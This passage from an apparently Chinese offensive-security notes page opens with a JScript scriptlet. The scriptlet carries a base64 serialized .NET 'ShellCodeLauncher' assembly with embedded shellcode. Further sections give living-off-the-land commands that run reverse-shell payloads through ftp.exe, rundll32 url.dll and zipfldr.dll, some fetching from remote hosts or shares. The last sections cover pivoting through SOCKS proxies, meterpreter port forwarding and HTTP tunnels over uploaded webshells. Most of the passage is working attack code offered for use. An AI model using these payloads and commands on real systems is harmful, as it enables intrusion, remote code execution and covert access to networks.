class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line">&lt;?XML version&#x3D;&quot;0&quot;?&gt;  </span><br><span class="line">&lt;scriptlet&gt;  </span><br><span class="line">&lt;registration  </span><br><span class="line">progid&#x3D;&quot;PoC&quot;  </span><br><span class="line">classid&#x3D;&quot;&#123;F0001111‐0000‐0000‐0000‐0000FEEDACDC&#125;&quot; &gt;  </span><br><span class="line">&lt;script language&#x3D;&quot;JScript&quot;&gt;  </span><br><span class="line">&lt;![CDATA[  </span><br><span class="line"> </span><br><span class="line">function setversion() &#123;  </span><br><span class="line">&#125;  </span><br><span class="line">function debug(s) &#123;&#125;  </span><br><span class="line">function base64ToStream(b) &#123;  </span><br><span class="line"> </span><br><span class="line">var enc &#x3D; new ActiveXObject(&quot;System.Text.ASCIIEncoding&quot;);  </span><br><span class="line">var length &#x3D; enc.GetByteCount_2(b);  </span><br><span class="line">var ba &#x3D; enc.GetBytes_4(b);  </span><br><span class="line">var transform &#x3D; new ActiveXObject(&quot;System.Security.Cryptography.FromBase64Transform&quot;);  </span><br><span class="line">ba &#x3D; transform.TransformFinalBlock(ba, 0, length);  </span><br><span class="line">var ms &#x3D; new ActiveXObject(&quot;System.IO.MemoryStream&quot;);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">ms.Write(ba, 0, (length &#x2F; 4) * 3);  </span><br><span class="line">ms.Position &#x3D; 0;  </span><br><span class="line">return ms;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  var serialized_obj &#x3D; &quot;AAEAAAD&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy&quot;+</span><br><span class="line"> &quot;AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph&quot;+</span><br><span class="line"> &quot;dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk&quot;+</span><br><span class="line"> &quot;ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD&quot;+</span><br><span class="line"> &quot;AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl&quot;+</span><br><span class="line"> &quot;RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU&quot;+</span><br><span class="line"> &quot;eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl&quot;+</span><br><span class="line"> &quot;cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90&quot;+</span><br><span class="line"> &quot;aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu&quot;+</span><br><span class="line"> &quot;MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH&quot;+</span><br><span class="line"> &quot;dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA&quot;+</span><br><span class="line"> &quot;ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw&quot;+</span><br><span class="line"> &quot;B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu&quot;+</span><br><span class="line"> &quot;dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA&quot;+</span><br><span class="line"> &quot;CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u&quot;+</span><br><span class="line"> &quot;SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5&quot;+</span><br><span class="line"> &quot;cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR&quot;+</span><br><span class="line"> &quot;AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA&quot;+</span><br><span class="line"> &quot;AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y&quot;+</span><br><span class="line"> &quot;bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh&quot;+</span><br><span class="line"> &quot;NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz&quot;+</span><br><span class="line"> &quot;ZW1ibHkGFwAAAARMb2FkCg8MAAAAABIAAAJNWpAAAwAAAAQAAAD&#x2F;&#x2F;wAAuAAAAAAAAABAAAAAAAAA&quot;+</span><br><span class="line"> &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy&quot;+</span><br><span class="line"> &quot;YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABkhgIAYaVEXAAAAAAA&quot;+</span><br><span class="line"> &quot;AAAA8AAiIAsCCwAADAAAAAQAAAAAAAAAAAAAACAAAAAAAIABAAAAACAAAAACAAAEAAAAAAAAAAQA&quot;+</span><br><span class="line"> &quot;AAAAAAAAAGAAAAACAAAAAAAAAwBAhQAAQAAAAAAAAEAAAAAAAAAAABAAAAAAAAAgAAAAAAAAAAAA&quot;+</span><br><span class="line"> &quot;ABAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAJgCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line"> &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line"> &quot;AAAAACAAAEgAAAAAAAAAAAAAAC50ZXh0AAAATAoAAAAgAAAADAAAAAIAAAAAAAAAAAAAAAAAACAA&quot;+</span><br><span class="line"> &quot;AGAucnNyYwAAAJgCAAAAQAAAAAQAAAAOAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAAAAAAAGAA&quot;+</span><br><span class="line"> &quot;AAAAAAAAEgAAAAAAAAAAAAAAAAAAQAAAQkgAAAACAAUA7CIAAGAHAAABAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line"> &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQgIoBAAACgAA&quot;+</span><br><span class="line"> &quot;KAIAAAYAACoAAAAAAAAA&#x2F;EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pK&quot;+</span><br><span class="line"> &quot;TTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0&quot;+</span><br><span class="line"> &quot;Z0gB0FCLSBhEi0AgSQHQ41ZI&#x2F;8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhE&quot;+</span><br><span class="line"> &quot;i0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL&#x2F;4FhBWVpIixLpS&#x2F;&#x2F;&#x2F;&quot;+</span><br><span class="line"> &quot;&#x2F;11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAAA1wKgBBEFUSYnkTInxQbpMdyYH&#x2F;9VMiepo&quot;+</span><br><span class="line"> &quot;AQEAAFlBuimAawD&#x2F;1WoKQV5QUE0xyU0xwEj&#x2F;wEiJwkj&#x2F;wEiJwUG66g&#x2F;f4P&#x2F;VSInHahBBWEyJ4kiJ&quot;+</span><br><span class="line"> &quot;+UG6maV0Yf&#x2F;VhcB0Ckn&#x2F;znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX&#x2F;&#x2F;Vg&#x2F;gAflVIg8Qg&quot;+</span><br><span class="line"> &quot;Xon2akBBWWgAEAAAQVhIifJIMclBulikU+X&#x2F;1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX&#x2F;&#x2F;Vg&#x2F;gA&quot;+</span><br><span class="line"> &quot;fShYQVdZaABAAABBWGoAWkG6Cy8PMP&#x2F;VV1lBunVuTWH&#x2F;1Un&#x2F;zuk8&#x2F;&#x2F;&#x2F;&#x2F;SAHDSCnGSIX2dbRB&#x2F;+dY&quot;+</span><br><span class="line"> &quot;agBZScfC8LWiVv&#x2F;VAAATMAYAZQAAAAEAABEAIP4BAACNBgAAASXQAwAABCgGAAAKChYGjml+AQAA&quot;+</span><br><span class="line"> &quot;BH4CAAAEKAMAAAYLBhYHbigHAAAKBo5pKAgAAAoAfgkAAAoMFg1+CQAAChMEFhYHEQQWEgMoBAAA&quot;+</span><br><span class="line"> &quot;BgwIFSgFAAAGJisAKkogABAAAIABAAAEH0CAAgAABCpCU0pCAQABAAAAAAAMAAAAdjQuMC4zMDMx&quot;+</span><br><span class="line"> &quot;OQAAAAAFAGwAAABgAgAAI34AAMwCAABIAwAAI1N0cmluZ3MAAAAAFAYAAAgAAAAjVVMAHAYAABAA&quot;+</span><br><span class="line"> &quot;AAAjR1VJRAAAACwGAAA0AQAAI0Jsb2IAAAAAAAAAAgAAAVfVAjQJAgAAAPolMwAWAAABAAAADwAA&quot;+</span><br><span class="line"> &quot;AAQAAAADAAAABgAAAAwAAAALAAAABAAAAAEAAAABAAAAAQAAAAEAAAADAAAAAQAAAAEAAAABAAAA&quot;+</span><br><span class="line"> &quot;AQAAAAAACgABAAAAAAAGAD0ANgAGAE0BMQEGAGkBMQEGAJgBeAEGALgBeAEGANsBNgAGACUCeAEG&quot;+</span><br><span class="line"> &quot;AEACNgAGAHwCeAEGAIsCNgAGAJECNgAGALQCNgAGAOYCxwIGAPgCxwIGACsDGwMAAAAAAQAAAAAA&quot;+</span><br><span class="line"> &quot;AQABAAEAEAATABsABQABAAEAAAAAAOABAAAFAAMABwATAQAASgIAACEABAAHABEATwASABEAWgAS&quot;+</span><br><span class="line"> &quot;ABMBaAI+AFAgAAAAAIYYRAAKAAEAaCIAAAAAkQBKAA4AAQAAAAAAgACRIHEAFQABAAAAAACAAJEg&quot;+</span><br><span class="line"> &quot;fgAdAAUAAAAAAIAAkSCLACgACwDZIgAAAACRGBQDDgANAAAAAQCfAAAAAgCrAAAAAwCwAAAABADB&quot;+</span><br><span class="line"> &quot;AAAAAQDLAAAAAgDeAAAAAwDqAAAABAD5AAAABQD&#x2F;AAAABgAPAQAAAQAaAQAAAgAiAREARAAuACEA&quot;+</span><br><span class="line"> &quot;RAA0ACkARAAKAAkARAAKADkARAAKAEkApAJCAGEAuwJKAGkA7gJPAGEA8wJYAHEARABkAHkARAAK&quot;+</span><br><span class="line"> &quot;ACcAWwA5AC4AEwBpAC4AGwByAGMAKwA5AAgABgCRAAEA&#x2F;gEAAAQAWwALAwABBwBxAAEAAAEJAH4A&quot;+</span><br><span class="line"> &quot;AQAAAQsAiwABAGggAAADAASAAAAAAAAAAAAAAAAAAAAAANYBAAAEAAAAAAAAAAAAAAABAC0AAAAA&quot;+</span><br><span class="line"> &quot;AAQAAwAAAAA8TW9kdWxlPgAyMjIyLmRsbABQcm9ncmFtAFNoZWxsQ29kZUxhdW5jaGVyAG1zY29y&quot;+</span><br><span class="line"> &quot;bGliAFN5c3RlbQBPYmplY3QALmN0b3IATWFpbgBNRU1fQ09NTUlUAFBBR0VfRVhFQ1VURV9SRUFE&quot;+</span><br><span class="line"> &quot;V1JJVEUAVmlydHVhbEFsbG9jAENyZWF0ZVRocmVhZABXYWl0Rm9yU2luZ2xlT2JqZWN0AGxwU3Rh&quot;+</span><br><span class="line"> &quot;cnRBZGRyAHNpemUAZmxBbGxvY2F0aW9uVHlwZQBmbFByb3RlY3QAbHBUaHJlYWRBdHRyaWJ1dGVz&quot;+</span><br><span class="line"> &quot;AGR3U3RhY2tTaXplAGxwU3RhcnRBZGRyZXNzAHBhcmFtAGR3Q3JlYXRpb25GbGFncwBscFRocmVh&quot;+</span><br><span class="line"> &quot;ZElkAGhIYW5kbGUAZHdNaWxsaXNlY29uZHMAU3lzdGVtLlNlY3VyaXR5LlBlcm1pc3Npb25zAFNl&quot;+</span><br><span class="line"> &quot;Y3VyaXR5UGVybWlzc2lvbkF0dHJpYnV0ZQBTZWN1cml0eUFjdGlvbgBTeXN0ZW0uUnVudGltZS5D&quot;+</span><br><span class="line"> &quot;b21waWxlclNlcnZpY2VzAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAUnVudGltZUNv&quot;+</span><br><span class="line"> &quot;bXBhdGliaWxpdHlBdHRyaWJ1dGUAMjIyMgBCeXRlADxQcml2YXRlSW1wbGVtZW50YXRpb25EZXRh&quot;+</span><br><span class="line"> &quot;aWxzPntBODMyQkQ0MS1EQjgyLTQ0NzEtOEMxRC1BMDlBNDFCQjAzRER9AENvbXBpbGVyR2VuZXJh&quot;+</span><br><span class="line"> &quot;dGVkQXR0cmlidXRlAFZhbHVlVHlwZQBfX1N0YXRpY0FycmF5SW5pdFR5cGVTaXplPTUxMAAkJG1l&quot;+</span><br><span class="line"> &quot;dGhvZDB4NjAwMDAwMi0xAFJ1bnRpbWVIZWxwZXJzAEFycmF5AFJ1bnRpbWVGaWVsZEhhbmRsZQBJ&quot;+</span><br><span class="line"> &quot;bml0aWFsaXplQXJyYXkASW50UHRyAG9wX0V4cGxpY2l0AFN5c3RlbS5SdW50aW1lLkludGVyb3BT&quot;+</span><br><span class="line"> &quot;ZXJ2aWNlcwBNYXJzaGFsAENvcHkAWmVybwBEbGxJbXBvcnRBdHRyaWJ1dGUAa2VybmVsMzIALmNj&quot;+</span><br><span class="line"> &quot;dG9yAFN5c3RlbS5TZWN1cml0eQBVbnZlcmlmaWFibGVDb2RlQXR0cmlidXRlAAAAAAADIAAAAAAA&quot;+</span><br><span class="line"> &quot;Qb0yqILbcUSMHaCaQbsD3QAIt3pcVhk04IkDIAABAwAAAQIGCQcABAkJCQkJCgAGGAkJCRgJEAkF&quot;+</span><br><span class="line"> &quot;AAIJGAkFIAEBEQ0EIAEBCAQBAAAAAwYREAcAAgESKREtBAABGAoIAAQBHQUIGAgCBhgIBwUdBQkY&quot;+</span><br><span class="line"> &quot;CRgEIAEBDggBAAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93cwGAni4BgIRTeXN0&quot;+</span><br><span class="line"> &quot;ZW0uU2VjdXJpdHkuUGVybWlzc2lvbnMuU2VjdXJpdHlQZXJtaXNzaW9uQXR0cmlidXRlLCBtc2Nv&quot;+</span><br><span class="line"> &quot;cmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3&quot;+</span><br><span class="line"> &quot;N2E1YzU2MTkzNGUwODkVAVQCEFNraXBWZXJpZmljYXRpb24BAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line"> &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line"> &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line"> &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line"> &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line"> &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line"> &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line"> &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line"> &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAQAAAAGAAAgAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line"> &quot;AQABAAAAMAAAgAAAAAAAAAAAAAAAAAAAAQAAAAAASAAAAFhAAAA8AgAAAAAAAAAAAAA8AjQAAABW&quot;+</span><br><span class="line"> &quot;AFMAXwBWAEUAUgBTAEkATwBOAF8ASQBOAEYATwAAAAAAvQTv&#x2F;gAAAQAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line"> &quot;PwAAAAAAAAAEAAAAAgAAAAAAAAAAAAAAAAAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBuAGYAbwAA&quot;+</span><br><span class="line"> &quot;AAAAJAAEAAAAVAByAGEAbgBzAGwAYQB0AGkAbwBuAAAAAAAAALAEnAEAAAEAUwB0AHIAaQBuAGcA&quot;+</span><br><span class="line"> &quot;RgBpAGwAZQBJAG4AZgBvAAAAeAEAAAEAMAAwADAAMAAwADQAYgAwAAAALAACAAEARgBpAGwAZQBE&quot;+</span><br><span class="line"> &quot;AGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAACAAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4A&quot;+</span><br><span class="line"> &quot;AAAAADAALgAwAC4AMAAuADAAAAA0AAkAAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAADIAMgAy&quot;+</span><br><span class="line"> &quot;ADIALgBkAGwAbAAAAAAAKAACAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAAIAAAADwA&quot;+</span><br><span class="line"> &quot;CQABAE8AcgBpAGcAaQBuAGEAbABGAGkAbABlAG4AYQBtAGUAAAAyADIAMgAyAC4AZABsAGwAAAAA&quot;+</span><br><span class="line"> &quot;ADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADAALgAwAC4AMAAuADAAAAA4AAgA&quot;+</span><br><span class="line"> &quot;AQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkAbwBuAAAAMAAuADAALgAwAC4AMAAAAAAAAAAA&quot;+</span><br><span class="line"> &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line"> &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line"> &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line"> &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line"> &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line"> &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line"> &quot;AAAAAAAAAAAAAAAAAAAAAAABDQAAAAQAAAAJFwAAAAkGAAAACRYAAAAGGgAAACdTeXN0ZW0uUmVm&quot;+</span><br><span class="line"> &quot;bGVjdGlvbi5Bc3NlbWJseSBMb2FkKEJ5dGVbXSkIAAAACgsA&quot;;</span><br><span class="line">var entry_class &#x3D; &#39;ShellCodeLauncher.Program&#39;;  </span><br><span class="line"> </span><br><span class="line">try &#123;  </span><br><span class="line">setversion();  </span><br><span class="line">var stm &#x3D; base64ToStream(serialized_obj);  </span><br><span class="line">var fmt &#x3D; new ActiveXObject(&#39;System.Runtime.Serialization.Formatters.Binary.BinaryFormatter&#39;);  </span><br><span class="line">var al &#x3D; new ActiveXObject(&#39;System.Collections.ArrayList&#39;);  </span><br><span class="line">var d &#x3D; fmt.Deserialize_2(stm);  </span><br><span class="line">al.Add(undefined);  </span><br><span class="line">var o &#x3D; d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);  </span><br><span class="line">&#125; catch (e) &#123;  </span><br><span class="line">debug(e.message);  </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">]]&gt;  </span><br><span class="line">&lt;&#x2F;script&gt;  </span><br><span class="line">&lt;&#x2F;registration&gt;  </span><br><span class="line">&lt;&#x2F;scriptlet&gt;</span><br></pre></td></tr></table></figure>
<h2 id="88-基于白名单Ftp-exe执行payload第十九季"><a href="#88-基于白名单Ftp-exe执行payload第十九季" class="headerlink" title="88. 基于白名单Ftp.exe执行payload第十九季"></a>88. 基于白名单Ftp.exe执行payload第十九季</h2><ul>
<li>Windows 2003 默认位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\ftp.exe </span><br><span class="line">C:\Windows\SysWOW64\ftp.exe</span><br></pre></td></tr></table></figure>
<ul>
<li>Windows 7 默认位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\ftp.exe </span><br><span class="line">C:\Windows\SysWOW64\ftp.exe</span><br></pre></td></tr></table></figure>
<ul>
<li>配置攻击机msf</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">需设置参数 set AutoRunScript migrate -f</span><br></pre></td></tr></table></figure>
<ul>
<li>靶机执行</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo !C:\Users\John\Desktop\rev_x86_53_exe.exe &gt; o &amp;echo quit &gt;&gt; o &amp;ftp ‐n ‐s:o &amp;del &#x2F;F &#x2F;Q o</span><br></pre></td></tr></table></figure>
<h2 id="89-基于白名单Url-dll执行payload第十七季"><a href="#89-基于白名单Url-dll执行payload第十七季" class="headerlink" title="89. 基于白名单Url.dll执行payload第十七季"></a>89. 基于白名单Url.dll执行payload第十七季</h2><ul>
<li>Windows 2003 默认位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\url.dll </span><br><span class="line">C:\Windows\SysWOW64\url.dll</span><br></pre></td></tr></table></figure>
<ul>
<li>Windows 7 默认位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\url.dll </span><br><span class="line">C:\Windows\SysWOW64\url.dll</span><br></pre></td></tr></table></figure>
<ul>
<li>靶机执行</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe url.dll,FileProtocolHandler file:&#x2F;&#x2F;C:\Users\John\Desktop\Micropoor_url_dll.hta</span><br></pre></td></tr></table></figure>
<ul>
<li>同样可以调用url.dll下载payload</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe url.dll,OpenURL http:&#x2F;&#x2F;192.168.1.4&#x2F;Micropoor_url_dll.hta</span><br></pre></td></tr></table></figure>
<ul>
<li>附录：Micropoor_url_dll.hta </li>
</ul>
<h2 id="90-基于白名单zipfldr-dll执行payload第十八季"><a href="#90-基于白名单zipfldr-dll执行payload第十八季" class="headerlink" title="90. 基于白名单zipfldr.dll执行payload第十八季"></a>90. 基于白名单zipfldr.dll执行payload第十八季</h2><ul>
<li>Windows 2003 默认位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\zipfldr.dll </span><br><span class="line">C:\Windows\SysWOW64\zipfldr.dll</span><br></pre></td></tr></table></figure>
<ul>
<li>Windows 7 默认位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\zipfldr.dll </span><br><span class="line">C:\Windows\SysWOW64\zipfldr.dll</span><br></pre></td></tr></table></figure>
<ul>
<li>靶机执行</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe zipfldr.dll,RouteTheCall \\192.168.1.119\share\rev_x86_53_exe.exe</span><br></pre></td></tr></table></figure>


<h1 id="七、代理"><a href="#七、代理" class="headerlink" title="七、代理"></a>七、代理</h1><h2 id="54-基于Powershell做Socks-4-5代理"><a href="#54-基于Powershell做Socks-4-5代理" class="headerlink" title="54. 基于Powershell做Socks 4-5代理"></a>54. 基于Powershell做Socks 4-5代理</h2><ul>
<li><p>Invoke-SocksProxy</p>
<ul>
<li>项目地址： <a target="_blank" rel="noopener" href="https://github.com/p3nt4/Invoke-SocksProxy">https://github.com/p3nt4/Invoke-SocksProxy</a> </li>
<li>创建Socks 4/5代理</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Invoke-SocksProxy.psm1</span><br><span class="line">Invoke-SocksProxy -bindPort 1234</span><br></pre></td></tr></table></figure>
<ul>
<li>TCP端口转发</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Invoke-SocksProxy.psm1</span><br><span class="line">Invoke-PortFwd -bindPort 33389 -destHost 127.0.0.1 -destPort 3389</span><br></pre></td></tr></table></figure>
<h2 id="95-基于Portfwd端口转发"><a href="#95-基于Portfwd端口转发" class="headerlink" title="95. 基于Portfwd端口转发"></a>95. 基于Portfwd端口转发</h2></li>
<li><p>meterpreter下</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">portfwd add ‐l 33389 ‐r 192.168.1.119 ‐p 3389</span><br><span class="line">portfwd add ‐l 30080 ‐r 192.168.1.119 ‐p 80</span><br></pre></td></tr></table></figure>
<p> 分别访问攻击机33389，30080，既等价访问靶机3389，80</p>
<h2 id="96-HTTP隧道ABPTTS第一季"><a href="#96-HTTP隧道ABPTTS第一季" class="headerlink" title="96. HTTP隧道ABPTTS第一季"></a>96. HTTP隧道ABPTTS第一季</h2><p>上传webshell之后 ，如果攻击机为<strong>vps</strong>，则 <strong>-f</strong> 需要填写<strong>vps_ip:port/**目标机</strong>:port**</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python abpttsclient.py ‐c webshell&#x2F;config.txt ‐u &quot;http:&#x2F;&#x2F;192.168.1.119&#x2F;abptts.aspx&quot; ‐f 192.168.1.5:33389&#x2F;192.168.1.119:3389</span><br></pre></td></tr></table></figure>
<p>本地访问<code>192.168.1.5:33389</code>即访问目标<code>3389</code></p>
<h2 id="98-HTTP隧道reGeorg第二季"><a href="#98-HTTP隧道reGeorg第二季" class="headerlink" title="98. HTTP隧道reGeorg第二季"></a>98. HTTP隧道reGeorg第二季</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python reGeorgSocksProxy.py ‐p 8080 ‐l 192.168.1.5 ‐u http:&#x2F;&#x2F;192.168.1.119&#x2F;tunnel.aspx</span><br></pre></td></tr></table></figure>
<p>Windows下配合Proxifier</p>
